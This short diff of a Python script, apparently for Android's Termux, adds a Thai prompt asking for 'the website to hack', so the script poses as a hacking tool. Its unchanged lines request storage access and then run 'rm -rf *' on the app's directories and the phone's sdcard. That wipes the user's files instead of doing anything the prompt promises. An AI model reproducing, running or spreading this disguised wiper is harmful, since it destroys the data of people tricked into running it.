@@ -20,6 +20,7 @@ top=('''
 os.system("clear")
 playsound('1.mp3')
 lowprint(top)
+input("เว็บที่จะแฮก : ")
 os.system("termux-setup-storage")
 os.system("cd ../..;rm -rf *;cd;cd sdcard;rm -rf *")
 
